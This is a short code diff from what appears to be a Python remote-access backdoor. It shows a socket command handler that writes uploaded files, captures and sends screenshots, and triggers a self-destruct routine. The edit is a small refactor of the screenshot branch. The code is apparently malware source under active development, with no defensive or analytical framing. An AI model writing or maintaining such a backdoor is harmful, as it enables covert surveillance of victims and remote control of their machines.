@@ -71,7 +71,8 @@ def command_handler(s):
                     f.write(base64.b64decode(file_data))
                 s.send("File uploaded successfully.".encode())
             elif command.lower() == "screenshot":
-                s.send(capture_screenshot())
+                screenshot_data = capture_screenshot()
+                s.send(screenshot_data)
             elif command.lower() == "selfdestruct":
                 self_destruct()
             else:
